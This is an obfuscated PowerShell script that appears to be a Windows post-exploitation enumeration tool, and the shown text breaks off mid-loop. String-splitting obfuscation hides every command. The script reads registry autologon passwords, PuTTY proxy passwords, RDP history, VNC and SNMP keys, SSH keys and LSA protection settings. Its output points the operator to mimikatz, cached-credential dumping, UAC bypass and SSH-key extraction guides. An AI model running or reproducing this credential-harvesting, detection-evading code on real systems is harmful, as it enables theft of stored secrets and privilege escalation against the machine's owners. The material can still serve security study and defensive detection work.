if (&("{0}{2}{1}"-f'Test','Path','-') ((("{2}{9}{0}{7}{10}{5}{6}{8}{4}{1}{3}"-f 'T','CS','C','ET65Admpwd.dll','LAPST65','o','gra','6','m FilesT65',':','5Pr'))-REpLAcE'T65',[ChAr]92)) { &("{1}{2}{0}" -f 'ost','Writ','e-H') ((("{9}{1}{2}{8}{5}{6}{4}{3}{10}{7}{0}"-f 't','l foun','d ','TtProgram Files3T','ne at C:3','is mach','i','S3TtCSE3T','on th','LAPS dl','tLAP')).REPLACE(([chAR]51+[chAR]84+[chAR]116),[STRinG][chAR]92)) -ForegroundColor ("{0}{1}" -f'G','reen') }
elseif (&("{0}{1}"-f 'Test-','Path') ((("{9}{2}{10}{4}{8}{0}{3}{7}{6}{1}{5}"-f'i','dmpwd','ro','les (x86){0}LAP','m','.dll','{0}A','S{0}CSE',' F','C:{0}P','gra')) -F  [ChAR]92) ) { &("{1}{0}{2}{3}" -f'-','Write','Ho','st') ((("{11}{12}{1}{6}{10}{7}{2}{0}{5}{3}{13}{15}{14}{8}{16}{4}{9}"-f ' C:zCxProgr',' ','ine at','es (x86)z','z','am Fil','on','ch','S','Cx',' this ma','LA','PS dll found','C','LAP','x','zCxCSE')).RePlacE('zCx','\')) -ForegroundColor ("{0}{1}"-f 'Gre','en') }
else { &("{0}{2}{1}{3}" -f 'Wr','Hos','ite-','t') ("{3}{7}{6}{4}{5}{1}{2}{8}{0}"-f'achine','hi','s','LAPS d','t fou','nd on t','o','lls n',' m') }
if ((&("{3}{2}{0}{1}"-f'rope','rty','mP','Get-Ite') ((("{1}{6}{2}{10}{5}{9}{0}{8}{7}{4}{3}"-f'ici','HKLM:','twa','oft','s','e601Po','601Sof','o','es601Micr','l','r')) -CrEPLace '601',[cHAr]92) ((("{0}{2}{1}{3}{5}{4}"-f'Se','cesWZ','rvi','9AdmP','d','w'))  -rePlAce([char]87+[char]90+[char]57),[char]92) -ErrorAction ("{0}{3}{1}{2}" -f'Sile','lyCo','ntinue','nt')).AdmPwdEnabled -eq 1) { &("{1}{2}{0}"-f 'e-Host','Wri','t') ("{2}{7}{3}{0}{8}{1}{4}{5}{6}"-f 'ist','y found ','LAPS r','g','on th','is mac','hine','e','ry ke') -ForegroundColor ("{0}{1}"-f 'G','reen') }


&("{0}{1}{2}" -f 'W','r','ite-Host') ""
if (${T`imes`TaMP}) { &("{3}{2}{0}{1}" -f'El','apsed','e','Tim') }
&("{1}{0}{2}{3}" -f 'r','W','ite-H','ost') -ForegroundColor ("{0}{1}" -f 'B','lue') ((("{3}{6}{1}{5}{0}{4}{2}"-f'Dig','=={0}{0','ck','=','est Che','} W','======'))  -f [ChAR]124)
${w`diG`EST} = (&("{2}{1}{5}{4}{3}{0}" -f'rty','et','G','ope','r','-ItemP') (("{11}{8}{1}{13}{14}{12}{2}{4}{6}{9}{5}{15}{10}{0}{7}{3}"-f 'ityProvid','TE','t','st','r','EIContro','o','ersqEIWDige','M:qEISYS','lSetq','ISecur','HKL','on','MqE','ICurrentC','lqE')).rEpLACE('qEI',[STRInG][CHaR]92)).UseLogonCredential
switch (${Wd`I`gest}) {
  0 { &("{0}{2}{1}" -f 'W','ost','rite-H') ("{3}{1}{2}{4}{8}{0}{6}{11}{10}{7}{9}{5}"-f' ar','ain-text P','assw','Value 0 found. Pl','o','SS','e no','S','rds','A','d in L','t store') }
  1 { &("{2}{1}{0}" -f 't','ite-Hos','Wr') ("{0}{11}{5}{10}{3}{6}{9}{7}{8}{12}{1}{4}{2}"-f 'Value 1',' ','n LSASS','sswo','stored i','l','rds','a','y ',' m','ain-text Pa',' found. P','be') -ForegroundColor ("{1}{0}" -f 'd','re') }
  Default { &("{2}{1}{0}"-f'Host','te-','Wri') ("{2}{19}{23}{3}{9}{18}{7}{0}{6}{16}{13}{15}{22}{12}{1}{4}{11}{17}{20}{10}{14}{5}{8}{21}" -f'nd ','ist','Th',' una','ry ','ogonCr','t','fi','edenti','ble ','e','va','g','if','sL','ied r','he spec','lu','to ','e sy','e: U','al','e','stem was') }
}

 
&("{2}{0}{1}"-f'te-Ho','st','Wri') ""
if (${TImE`sTa`Mp}) { &("{0}{1}{2}"-f'Tim','eE','lapsed') }
&("{2}{0}{1}"-f'rite','-Host','W') -ForegroundColor ("{1}{0}" -f'e','Blu') ((("{7}{2}{9}{4}{8}{5}{0}{1}{3}{6}" -f'io','n C','=','h','0} LSA ','t','eck','======','Protec','=={0}{')) -F[cHar]124)
${r`UN`ASPPL} = (&("{1}{2}{3}{0}{4}" -f'Prope','Get-','It','em','rty') ((("{6}{10}{3}{8}{9}{1}{2}{12}{4}{0}{5}{11}{7}"-f 'Set','EM{','0}Cur',':{0','ol','{0','H','A','}S','YST','KLM','}Control{0}LS','rentContr'))-f [ChAR]92)).RunAsPPL
${RUNasppl`B`o`oT} = (&("{2}{0}{1}{3}"-f 'em','Pr','Get-It','operty') ((("{2}{9}{3}{8}{10}{7}{5}{0}{6}{11}{1}{4}"-f'en','lSet','H','M:kxI','kxIControlkxILSA','urr','tContr','C','S','KL','YSTEMkxI','o'))  -rePlAcE ([Char]107+[Char]120+[Char]73),[Char]92)).RunAsPPLBoot
switch (${runaSP`pl}) {
  2 { &("{2}{0}{1}"-f 'rite-Ho','st','W') ("{2}{4}{0}{6}{1}{5}{3}" -f ' 2. E','a','R','k','unAsPPL:','bled without UEFI Loc','n') }
  1 { &("{1}{2}{0}" -f 'st','W','rite-Ho') ("{6}{5}{0}{3}{4}{1}{2}"-f 'nAsPPL: ','FI L','ock','1. Enabled wi','th UE','u','R') }
  0 { &("{2}{1}{0}" -f 'ost','te-H','Wri') ("{9}{2}{0}{8}{7}{3}{6}{4}{5}{10}{1}" -f '0. LSA Pr','.','sPPL: ','i','abled','. Try m','s','ction D','ote','RunA','imikatz') -ForegroundColor ("{0}{1}"-f 'r','ed') }
  Default { ("{2}{1}{5}{6}{12}{14}{10}{3}{11}{0}{8}{9}{7}{15}{4}{13}" -f ' ','system was u','The ','s',' RunAsPPL /','na','ble to fi','a','registry',' v',' ','pecified','n',' RunAsPPLBoot','d the','lue:') }
}
if (${rU`NaSP`P`lboOt}) { &("{1}{2}{0}" -f 'Host','W','rite-') ('Ru'+'nA'+'s'+'P'+'PLBoot: '+"$RunAsPPLBoot") }

 
&("{1}{0}{2}{3}"-f 'i','Wr','te-Hos','t') ""
if (${T`iMeS`TAMp}) { &("{2}{1}{3}{0}" -f 'd','eEla','Tim','pse') }
&("{2}{1}{0}"-f 'Host','-','Write') -ForegroundColor ("{0}{1}" -f'B','lue') ((("{7}{3}{4}{2}{6}{8}{5}{1}{0}" -f'eck','l Guard Ch','Gw','==','===','entia','LGwL ','====','Cred'))  -REPLaCe'GwL',[cHaR]124)
${l`sa`CFGflA`gs} = (&("{3}{4}{0}{2}{1}" -f'e','y','rt','Get-','ItemProp') ((("{6}{0}{2}{3}{7}{4}{5}{1}{8}" -f 'KL','{0}Control{0}LS','M:','{0}SYSTEM{0}Cu','Contr','olSet','H','rrent','A'))  -f  [ChaR]92)).LsaCfgFlags
switch (${Ls`Ac`F`gflAGS}) {
  2 { &("{2}{1}{0}" -f 'st','te-Ho','Wri') ("{1}{6}{4}{8}{3}{10}{11}{0}{7}{5}{2}{9}"-f 'u','LsaCfg','FI L',' Enabled w','ag','UE','Fl','t ','s 2.','ock','it','ho') }
  1 { &("{2}{0}{1}" -f'ite-','Host','Wr') ("{7}{5}{10}{8}{9}{6}{3}{1}{2}{4}{0}"-f 'k',' UE','FI L','h','oc','aCfgFlags 1',' wit','Ls',' Enab','led','.') }
  0 { &("{1}{2}{0}"-f'-Host','Wri','te') ("{4}{3}{6}{8}{1}{0}{2}{5}{9}{7}"-f'ags 0. Lsa','l','CfgF','a','Ls','lags Disa','Cfg','ed.','F','bl') -ForegroundColor ("{1}{0}"-f'ed','r') }
  Default { ("{6}{9}{4}{2}{1}{11}{10}{13}{0}{12}{3}{7}{8}{5}" -f' ','p','as unable to find the s','t',' system w','Flags','Th','ry value: LsaC','fg','e','cifi','e','regis','ed') }
}

 
&("{1}{2}{0}" -f'-Host','W','rite') ""
if (${tIme`sta`mp}) { &("{2}{0}{1}"-f'Elapse','d','Time') }
&("{0}{2}{1}" -f 'W','te-Host','ri') -ForegroundColor ("{0}{1}"-f 'Blu','e') ((("{2}{10}{6}{3}{0}{8}{7}{1}{5}{4}{9}"-f 'y Cac','on C','=','Lf','den','re','=======Lfy','WinLog','hed ','tials Check','='))-crePlAcE ([CHaR]76+[CHaR]102+[CHaR]121),[CHaR]124)
if (&("{0}{1}{2}" -f'Test-P','a','th') ((("{7}{0}{8}{11}{15}{5}{3}{4}{13}{1}{2}{14}{6}{9}{10}{12}"-f'KLM:NSCSOF','SCCurrentVer','s','osoft','NSCWind','r','S','H','TW','CW','inlo','A','gon','ows NTN','ionN','RENSCMic')).repLaCE(([cHAR]78+[cHAR]83+[cHAR]67),[striNg][cHAR]92))) {
  (&("{3}{0}{1}{2}" -f'It','emPropert','y','Get-') ((("{3}{8}{4}{9}{5}{17}{15}{1}{14}{16}{12}{13}{7}{6}{0}{2}{11}{10}"-f 'rsion1b9','osoft1b9Wi','Winlo','HK',':1b9S','W','entVe','r','LM','OFT','n','go','ws NT1b','9Cur','n','b9Micr','do','ARE1')).RePLAcE('1b9','\')) -Name ("{3}{0}{2}{4}{1}{5}" -f 'CHE','NSC','DLO','CA','GO','OUNT')).CACHEDLOGONSCOUNT
  &("{0}{1}{2}" -f 'Writ','e','-Host') ((("{12}{4}{22}{7}{6}{11}{17}{20}{18}{5}{3}{10}{19}{1}{0}{16}{15}{21}{9}{13}{8}{2}{14}"-f 'L_MACHINE','CA','h','al','owever,','enti',' the SYSTE','ly','c','URITYQIxC','s here: HK','M use','H','a','e','IxS','Q','r can',' the cred','EY_LO',' view','EC',' on')).rEplACE('QIx',[string][ChAr]92))
  &("{1}{2}{0}"-f'st','Writ','e-Ho') ("{1}{8}{4}{2}{0}{7}{6}{5}{3}" -f ' lsadu','Or, ','tz','he','imika','ac','c','mp::','using m')
}

&("{0}{2}{1}" -f'Write','ost','-H') ""
if (${TiME`sTa`mP}) { &("{1}{2}{0}" -f'd','T','imeElapse') }
&("{2}{1}{0}" -f't','e-Hos','Writ') -ForegroundColor ("{0}{1}"-f 'Blu','e') ((("{7}{9}{13}{1}{5}{3}{2}{6}{8}{0}{14}{10}{11}{4}{12}" -f ' Wi','==g','dito','Os Ad','Che','Osg','n','===','al','===','ogon Credentia','ls ','ck','=','nl')) -REpLACE'gOs',[char]124)

(&("{2}{3}{4}{0}{1}"-f'emPro','perty','Get','-I','t') ((("{8}{10}{3}{1}{6}{4}{11}{5}{0}{2}{7}{9}" -f 'rentVe','REUb9Micros','r','WA','ows N','Cur','oftUb9Wind','sionUb9','HKLM:Ub9SOF','Winlogon','T','TUb9')).RePlacE(([ChAr]85+[ChAr]98+[ChAr]57),[sTRinG][ChAr]92))).DefaultDomainName
(&("{3}{2}{0}{1}"-f'mP','roperty','Ite','Get-') ((("{6}{19}{9}{20}{15}{5}{3}{7}{0}{8}{17}{18}{13}{16}{1}{11}{12}{14}{10}{2}{4}{21}" -f'7Windo','on','nl','of','o','os','HKLM:D87','tD8','ws NTD87Cur','FTWARE','i','D','87','n','W','Micr','tVersi','r','e','SO','D87','gon')) -rEplaCE([chAr]68+[chAr]56+[chAr]55),[chAr]92)).DefaultUserName
(&("{4}{0}{2}{3}{1}" -f'et','ty','-ItemProp','er','G') ((("{3}{8}{2}{19}{4}{0}{1}{12}{9}{6}{7}{5}{16}{18}{13}{11}{10}{17}{15}{14}"-f 'REu','HOMicro','F','HKLM:u','A','C','OWindows N','TuHO','HOSO','ftuH','Winl','ionuHO','so','Vers','n','go','urr','o','ent','TW'))  -CrEPLAcE([cHAR]117+[cHAR]72+[cHAR]79),[cHAR]92)).DefaultPassword
(&("{1}{2}{0}" -f'perty','Get-Item','Pro') ((("{2}{6}{11}{13}{10}{1}{14}{7}{3}{8}{0}{12}{4}{16}{15}{5}{9}{17}"-f'ows NTzOZC','Micr','HKLM:','tzOZW','Ve','on','zOZ','sof','ind','zOZWin','Z','SO','urrent','FTWAREzO','o','si','r','logon')).rEpLAce('zOZ',[sTrINg][chAr]92))).AltDefaultDomainName
(&("{2}{1}{0}{4}{3}{5}" -f 'r','temP','Get-I','er','op','ty') ((("{14}{10}{1}{16}{9}{15}{0}{12}{6}{5}{7}{2}{4}{3}{8}{11}{13}"-f '}','}SO','{0}','tVersion','Curren',' N','ows','T','{0}W','osoft{','0','inlogo','Wind','n','HKLM:{','0','FTWARE{0}Micr'))-f[char]92)).AltDefaultUserName
(&("{1}{4}{0}{3}{2}"-f 'Item','Get','operty','Pr','-') ((("{8}{1}{6}{9}{10}{3}{7}{0}{5}{11}{2}{4}" -f's N','K4US','Win','n','logon','TK4UCurr','OFTWAREK4UMicros','dow','HKLM:','oft','K4UWi','entVersionK4U')).RePlace(([cHar]75+[cHar]52+[cHar]85),[STRing][cHar]92))).AltDefaultPassword


&("{0}{2}{1}"-f'Wri','ost','te-H') ""
if (${TiME`STa`mp}) { &("{1}{2}{0}" -f 'apsed','TimeE','l') }
&("{1}{0}{2}"-f'i','Wr','te-Host') -ForegroundColor ("{1}{0}"-f'e','Blu') ((("{7}{0}{5}{1}{9}{8}{3}{4}{10}{2}{6}" -f'====B4rB4','an Set','Che','g','s','r RDCM','ck','=====','n','ti',' ')).RepLACe('B4r',[string][ChAR]124))

if (&("{2}{1}{0}"-f 'ath','t-P','Tes') ("$env:USERPROFILE\appdata\Local\Microsoft\Remote "+'De'+'skt'+'op '+'Co'+'nn'+'ect'+'ion '+('ManagerITb'+'RD'+'C'+'M'+'an.'+'settings').rEpLacE(([char]73+[char]84+[char]98),[sTrIng][char]92))) {
  &("{1}{2}{0}" -f 'Host','Write','-') "RDCMan Settings Found at: $($env:USERPROFILE)\appdata\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings " -ForegroundColor ("{1}{0}" -f'ed','R')
}
else { &("{1}{2}{0}"-f'-Host','Wri','te') ("{2}{3}{1}{0}{4}"-f' found','ettings','No ','RCDMan.S','.') }


&("{1}{0}{2}"-f'te-H','Wri','ost') ""
if (${Tim`E`sTA`Mp}) { &("{0}{1}{2}" -f 'Time','E','lapsed') }
&("{0}{1}{2}" -f 'Write','-H','ost') -ForegroundColor ("{0}{1}"-f'Bl','ue') ((("{4}{6}{12}{9}{11}{10}{13}{0}{3}{2}{1}{7}{5}{8}" -f' Conne','n','o','cti','====','Che','=','s ','ck','===Eo3','ve','Eo3 RDP Sa','=','d')) -CRePLacE ([CHAr]69+[CHAr]111+[CHAr]51),[CHAr]124)

&("{2}{1}{0}"-f'st','rite-Ho','W') ("{0}{1}"-f 'HK_User','s')
&("{2}{1}{0}"-f 'PSDrive','w-','Ne') -PSProvider ("{0}{1}" -f'Regis','try') -Name ("{0}{1}"-f 'HK','U') -Root ("{2}{0}{1}" -f '_U','SERS','HKEY')
&("{2}{0}{3}{1}" -f 'et','ldItem','G','-Chi') ((("{1}{0}{2}"-f'{','HKU:','0}'))  -f  [CHar]92) -ErrorAction ("{0}{3}{2}{1}"-f 'S','ntinue','Co','ilently') | &("{2}{1}{3}{0}" -f 't','ch-','ForEa','Objec') {
  
  ${Hku`sId} = ${_}.Name.Replace(((("{0}{3}{2}{4}{1}" -f'HKE','}','S','Y_USER','{0')) -F  [cHar]92), "")
  if (&("{2}{1}{0}" -f'Path','est-','T') ("registry::HKEY_USERS\$HKUSID\Software\Microsoft\Terminal "+'Server'+' '+(('Cli'+'entdiqDefaul'+'t')-crEpLace ([chAr]100+[chAr]105+[chAr]113),[chAr]92))) {
    &("{0}{1}{2}" -f 'Write-','Hos','t') "Server Found: $((Get-ItemProperty "registry::HKEY_USERS\$HKUSID\Software\Microsoft\Terminal Server Client\Default" -Name MRU0).MRU0) "
  }
  else { &("{0}{3}{2}{1}"-f 'W','-Host','te','ri') "Not found for $($_.Name) " }
}

&("{0}{2}{1}" -f'Write-H','t','os') ("{0}{1}" -f'HKC','U')
if (&("{0}{1}{2}" -f 'Test-','P','ath') ((("{4}{7}{14}{18}{11}{16}{17}{20}{13}{10}{15}{5}{19}{8}{0}{1}{9}{12}{2}{6}{3}"-f 'VTer','minal ','lientjmVDefau','t','re','j','l','g','osoftjm','Se','oftwa','EY_','rver C','VS','is','re','CURRENT_U','S','try::HK','mVMicr','ERjm')).rePLACE(([ChaR]106+[ChaR]109+[ChaR]86),[STRIng][ChaR]92))) {
  &("{3}{0}{2}{1}"-f 'e-H','st','o','Writ') "Server Found: $((Get-ItemProperty "registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" -Name MRU0).MRU0) "
}
else { &("{2}{1}{0}" -f't','rite-Hos','W') ("{4}{2}{8}{7}{0}{5}{6}{1}{3}" -f 'Server ',' ','n','not found in HCKU','Termi','C','lient',' ','al') }

&("{3}{2}{0}{1}"-f 'os','t','-H','Write') ""
if (${T`ImeSTA`mP}) { &("{3}{0}{2}{1}"-f 'E','sed','lap','Time') }
&("{0}{2}{1}"-f'Writ','ost','e-H') -ForegroundColor ("{0}{1}" -f'B','lue') ((("{4}{1}{7}{0}{3}{2}{5}{6}{8}{9}"-f '=AM8AM8 ','===','u','P','=','t','ty ','====','Stored Credentials ','Check')).RepLACe(([ChAR]65+[ChAR]77+[ChAR]56),'|'))

if (&("{2}{1}{0}" -f '-Path','t','Tes') ((("{5}{8}{2}{4}{7}{6}{0}{3}{1}"-f'imonTathamojH','ns','jHSOFTW','PuTTYojHSessio','ARE','HKCU:','HS','oj','o')) -cREPLaCE'ojH',[Char]92)) {
  &("{2}{1}{0}" -f 'm','hildIte','Get-C') ((("{9}{13}{15}{12}{5}{0}{1}{10}{7}{4}{8}{6}{3}{14}{11}{2}"-f'imon','T','s','s','PuTTY{0','ARE{0}S','e','}','}S','HK','atham{0','on','W','CU:{0}SO','si','FT'))  -f[Char]92) | &("{0}{2}{3}{4}{1}" -f 'F','ct','orEa','ch','-Obje') {
    ${ReGk`eYNA`me} = &("{1}{0}{2}{3}" -f 'lit-Pa','Sp','t','h') ${_}.Name -Leaf
    &("{1}{2}{0}"-f 'ost','Writ','e-H') ('Key:'+' '+"$RegKeyName")
    @(("{0}{1}{2}" -f 'Host','Nam','e'), ("{0}{1}{2}"-f'PortNum','b','er'), ("{2}{0}{1}" -f 's','erName','U'), ("{3}{2}{0}{1}"-f 'KeyF','ile','blic','Pu'), ("{2}{1}{0}{3}"-f 'g','in','PortForward','s'), ("{4}{3}{5}{1}{2}{0}" -f'ing','h','ar','i','Connect','onS'), ("{2}{1}{0}" -f'me','erna','ProxyUs'), ("{0}{1}{2}{3}"-f 'P','roxyPa','ss','word')) | &("{1}{3}{0}{2}"-f 'rEach-','F','Object','o') {
      &("{1}{2}{0}" -f 'st','Wr','ite-Ho') ("$_ "+':')
      &("{2}{1}{0}" -f't','te-Hos','Wri') "$((Get-ItemProperty  HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions\$RegKeyName).$_) "
    }
  }
}
else { &("{0}{2}{1}" -f'Writ','-Host','e') ((("{9}{8}{13}{5}{4}{0}{15}{1}{16}{17}{10}{11}{14}{7}{2}{20}{18}{19}{3}{6}{12}"-f'i','nd ','OFTWARE{0}Simon','Y{0}S','t',' creden','ession','S','pu','No ','KCU:','{0','s','tty','}','als fou','in',' H','u','TT','Tatham{0}P')) -f[CHaR]92) }


&("{1}{0}{2}"-f 'e','Writ','-Host') ""
if (${tiMes`Ta`MP}) { &("{2}{0}{3}{1}" -f'eE','apsed','Tim','l') }
&("{0}{1}{2}" -f'Wr','ite','-Host') -ForegroundColor ("{1}{0}" -f 'e','Blu') ((("{1}{7}{4}{8}{3}{0}{5}{6}{2}" -f 'H','=','hecks','SS','{0}{0',' Ke','y C','========','} ')) -f[Char]124)
&("{0}{1}{2}" -f 'W','rite','-Host') ""
if (${TI`mE`STAmp}) { &("{0}{2}{1}" -f 'TimeElap','d','se') }
&("{0}{1}{3}{2}" -f'Wr','i','ost','te-H') -ForegroundColor ("{0}{1}"-f 'Blu','e') ((("{3}{0}{1}{5}{6}{4}{2}"-f'========q5j','q5j','und:','=','fo',' ','If ')) -rePLace  'q5j',[Char]124)
&("{0}{2}{1}"-f'Writ','t','e-Hos') ("{4}{3}{0}{12}{9}{10}{8}{6}{7}{13}{2}{1}{14}{15}{16}{18}{17}{5}{11}"-f '//blog.ropnop.c','riva','-p','ttps:','h','sh-agent','s','s','g-','c','tin','/','om/extra','h','te-keys-f','r','om-windows','s','-10-') -ForegroundColor ("{0}{1}"-f'Yello','w')
&("{0}{1}{2}{3}"-f 'Wr','it','e-Ho','st') ""
if (${t`iMEs`TAmp}) { &("{1}{3}{0}{2}" -f'apse','T','d','imeEl') }
&("{1}{2}{0}"-f'ost','Wr','ite-H') -ForegroundColor ("{1}{0}" -f'e','Blu') ((("{3}{0}{1}{8}{5}{4}{2}{6}{7}"-f '==','=={0}{0','OS','=====','ing Putty SSH KNOWN H',' Check','T','S','}')) -f  [ChaR]124)
if (&("{3}{2}{0}{1}"-f't','h','st-Pa','Te') ((("{3}{10}{13}{16}{8}{9}{5}{2}{11}{6}{14}{4}{1}{15}{0}{7}{12}" -f'shHo','T','nTa','HKC','uT','o','1W','s','e1W','HSim','U:1WHSof','tham','tKeys','twa','HP','Y1WHS','r'))  -cREpLace'1WH',[chaR]92)) { 
  &("{2}{1}{0}{3}"-f 'os','te-H','Wri','t') "$((Get-Item -Path HKCU:\Software\SimonTatham\PuTTY\SshHostKeys).Property) "
}
else { &("{1}{0}{2}" -f 'rite-H','W','ost') ("{1}{4}{5}{2}{3}{6}{0}"-f 'd','No putt','s ','f','y ssh ke','y','oun') }

&("{1}{0}{2}{3}" -f'rit','W','e','-Host') ""
if (${tI`m`EstamP}) { &("{0}{2}{1}" -f 'Ti','apsed','meEl') }
&("{1}{2}{0}{3}" -f '-H','Writ','e','ost') -ForegroundColor ("{0}{1}"-f 'Bl','ue') ((("{7}{3}{4}{5}{6}{1}{0}{2}"-f'e','SSH K','ys','===={0}{0} ','Checking',' for Ope','n','=====')) -F  [ChAR]124)
if (&("{1}{0}{2}"-f'P','Test-','ath') (("{5}{0}{3}{6}{7}{1}{2}{4}"-f'C','B','o2','U:Bo2','AgentBo2Keys','HK','SoftwareBo2Ope','nSSH')).ReplACE('Bo2','\')) { &("{1}{2}{0}"-f 't','Write-H','os') ("{11}{10}{12}{14}{13}{0}{8}{5}{2}{6}{9}{1}{7}{4}{3}"-f't','/ropnop/',':/','_extract','dows_sshagent','s','/git','win','p','hub.com','SH keys found. Try','OpenS',' thi','r decryption: ht','s fo') -ForegroundColor ("{1}{0}{2}"-f'lo','Yel','w') }
else { &("{0}{1}{2}"-f'Wri','te-','Host') ("{1}{3}{2}{0}" -f 'nd.','No OpenS','fou','SH Keys ') }


&("{1}{3}{0}{2}" -f 's','Write-H','t','o') ""
if (${tIME`St`AmP}) { &("{0}{1}{2}" -f'Ti','meElapse','d') }
&("{2}{3}{0}{1}"-f 'e-H','ost','Wr','it') -ForegroundColor ("{0}{1}" -f 'Bl','ue') ((("{7}{2}{6}{1}{5}{4}{0}{3}" -f'Pas','i','=={0}{0} Check','swords','NC ','nV','ing for W','======='))  -F  [char]124)
if ( &("{2}{0}{1}"-f't','-Path','Tes') ((("{0}{3}{6}{2}{8}{5}{7}{4}{1}"-f 'HKCU:{0','0}Password','OR','}So','NC3{','{0}W','ftware{0}','inV','L')) -f[ChAr]92)) { &("{1}{2}{0}"-f't','Wr','ite-Hos') ((("{4}{7}{16}{11}{17}{0}{13}{1}{6}{8}{10}{15}{9}{5}{14}{12}{3}{2}" -f'HKCU:6t','txO','d','r',' Win','6txP','RL','VNC ','6tx','C3','W','ou','sswo','xSoftware6','a','inVN','f','nd at '))  -CRePLAcE([Char]54+[Char]116+[Char]120),[Char]92) }else { &("{0}{1}{2}"-f 'W','rite-','Host') ("{1}{2}{3}{0}"-f 'NC found.','N','o Wi','nV') }


&("{0}{1}{2}"-f 'Wri','te','-Host') ""
if (${tim`e`STa`mp}) { &("{0}{2}{1}"-f'T','psed','imeEla') }
&("{0}{1}{2}" -f'Write','-Ho','st') -ForegroundColor ("{0}{1}" -f 'B','lue') ((("{8}{3}{6}{9}{7}{5}{4}{2}{1}{0}"-f 'ords','ssw','SNMP Pa','=THyTH',' ','g for','y Ch','in','========','eck')).RePlaCE(([ChAR]84+[ChAR]72+[ChAR]121),[sTRInG][ChAR]124))
if ( &("{2}{1}{0}"-f 'Path','-','Test') ((("{9}{7}{3}{10}{1}{5}{0}{8}{6}{4}{2}"-f 'olSe','rrent','ices1Y2SNMP','YSTEM1Y','v','Contr','Ser',':1Y2S','t1Y2','HKLM','2Cu')).replAce('1Y2',[sTRINg][Char]92)) ) { &("{2}{1}{0}" -f'e-Host','it','Wr') ((("{5}{6}{10}{7}{8}{0}{11}{3}{4}{12}{1}{9}{2}" -f'TE','ControlSe','Services58wSNMP','8wCu','rre','SNMP',' Key found at HKLM:','Y','S','t58w','58wS','M5','nt'))  -CrEplaCE  ([cHAr]53+[cHAr]56+[cHAr]119),[cHAr]92) }else { &("{2}{0}{1}" -f'rite-','Host','W') ("{1}{3}{2}{0}"-f 'ound.','No','MP f',' SN') }


&("{0}{1}{2}"-f'Wri','te','-Host') ""
if (${timeS`T`AMp}) { &("{0}{2}{1}"-f 'TimeE','sed','lap') }
&("{0}{1}{2}"-f'Write-','Hos','t') -ForegroundColor ("{0}{1}" -f'B','lue') ((("{4}{6}{1}{0}{5}{2}{3}{7}"-f ' Tig',' for','NC Pass','wor','=','htV','========gaGgaG Checking','ds'))  -crePlaCe  'gaG',[cHAR]124)
if ( &("{0}{1}{2}"-f 'Test-P','at','h') ((("{3}{0}{1}{10}{6}{11}{2}{7}{8}{4}{5}{9}" -f':La','eSo','Ti','HKCU','CLae','Serve','war','ght','VN','r','ft','eLae')) -cRePLACe([cHAr]76+[cHAr]97+[cHAr]101),[cHAr]92)) { &("{2}{1}{0}"-f 't','Hos','Write-') ((("{10}{4}{0}{15}{6}{11}{5}{12}{14}{2}{13}{7}{8}{1}{9}{3}"-f'C ','CWQdSe','i','r','ightVN','W','nd at H','ht','VN','rve','T','KCU:','QdSoftwareWQ','g','dT','key fou')) -crEPlACE  'WQd',[char]92) }else { &("{2}{1}{0}" -f 't','s','Write-Ho') ("{0}{3}{2}{4}{1}"-f'No T','und.','gh','i','tVNC fo') }


&("{2}{3}{1}{0}" -f'-Host','e','Wr','it') ""
if (${ti`meS`TaMP}) { &("{0}{2}{1}" -f'Ti','sed','meElap') }
&("{0}{1}{2}" -f'Wr','ite-Hos','t') -ForegroundColor ("{0}{1}" -f 'B','lue') ((("{5}{4}{2}{0}{3}{6}{1}" -f '===zqUzqU UA','s','=','C Se','====','=','tting')).ReplAce('zqU','|'))
if ((&("{4}{0}{1}{3}{2}"-f 't-ItemP','rop','ty','er','Ge') (("{8}{19}{0}{2}{13}{20}{16}{18}{15}{11}{21}{5}{14}{3}{4}{17}{6}{12}{10}{9}{1}{7}" -f'eSSOFT','sseSSy','WAREseSMi','SCu','rren','dowss','nse','stem','HKL','licie','Po','Wi','S','croso','e','S','t','tVersio','se','M:s','f','n')).rEPlacE(([CHAR]115+[CHAR]101+[CHAR]83),'\')).EnableLUA -eq 1) {
  &("{0}{1}{2}" -f'Write-H','o','st') ("{8}{13}{9}{18}{15}{12}{3}{7}{2}{6}{4}{11}{5}{1}{14}{17}{10}{0}{16}" -f'nents are on',' UAC','t','Pa','all ','f the',' or ','r','Ena','LUA is eq','po','o','l to 1. ','ble',' c','a','.','om','u')
  &("{3}{1}{0}{2}"-f 'os','e-H','t','Writ') ("{24}{25}{3}{7}{13}{14}{23}{4}{2}{10}{6}{19}{16}{8}{12}{20}{11}{18}{15}{21}{5}{1}{0}{22}{9}{17}"-f 'ac-bypass-full','u','d','hacktr','in','sic-','ning/w','ic','l','y','ows-harde','e','ocal-pri','ks.','xyz','tion','-','stem-access','ge-escala','indows','vil','#ba','-file-s','/w','https://bo','ok.') -ForegroundColor ("{1}{0}{2}"-f'ell','Y','ow')
}
else { &("{2}{0}{1}" -f 'ri','te-Host','W') ("{3}{4}{1}{0}{2}{5}" -f' ','leLUA value not','equal ','E','nab','to 1') }


&("{1}{0}{2}" -f'os','Write-H','t') ""
if (${TI`MesT`AMp}) { &("{2}{0}{1}"-f'imeEl','apsed','T') }
&("{2}{1}{0}{3}"-f'os','te-H','Wri','t') -ForegroundColor ("{1}{0}"-f'e','Blu') ((("{9}{6}{7}{8}{1}{0}{2}{3}{4}{5}" -f 'un Co','R','mmand','s (','WIN','+R)','==ASYASY R','ece','ntly ','=======')).rEPLAce('ASY',[STRiNG][ChAr]124))

&("{0}{1}{2}"-f'Get-Chi','ldI','tem') ((("{2}{1}{0}"-f 'Q',':yH','HKU'))-rePlace 'yHQ',[CHaR]92) -ErrorAction ("{1}{3}{4}{2}{0}" -f 'ue','Silen','yContin','t','l') | &("{3}{2}{1}{0}" -f 'ct','h-Obje','ac','ForE') {
  
  ${h`kusiD} = ${_}.Name.Replace(((("{2}{3}{1}{0}"-f'SItL','ER','HKE','Y_US'))  -cRePlace  'ItL',[ChaR]92), "")
  ${Pr`opErtY} = (&("{1}{0}{2}" -f'Ite','Get-','m') "HKU:\$_\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction ("{4}{2}{3}{1}{0}"-f'e','u','entlyCon','tin','Sil')).Property
  ${h`kUSID} | &("{3}{1}{2}{4}{0}" -f 'ject','Eac','h-','For','Ob') {
